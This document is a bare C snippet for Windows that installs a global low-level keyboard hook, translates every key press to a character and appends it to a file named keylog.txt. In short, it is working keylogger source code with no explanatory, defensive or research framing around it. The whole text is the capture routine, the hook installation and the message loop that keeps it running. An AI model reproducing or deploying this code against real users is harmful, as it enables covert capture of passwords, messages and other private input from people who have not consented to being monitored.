HHOOK g_hook;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            FILE* log = fopen("keylog.txt", "a");
            if (log) {
                DWORD vk = kb->vkCode;
                DWORD scan = MapVirtualKey(vk, MAPVK_VK_TO_VSC);

                // Handle shift state
                BYTE keyboard_state[256];
                GetKeyboardState(keyboard_state);
                WORD ascii;
                ToAscii(vk, scan, keyboard_state, &ascii, 0);

                fprintf(log, "%c", (char)ascii);
                fclose(log);
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Install hook
g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                          GetModuleHandle(NULL), 0);

// Message loop (required for hook callbacks)
MSG msg;
while (GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
}
UnhookWindowsHookEx(g_hook);
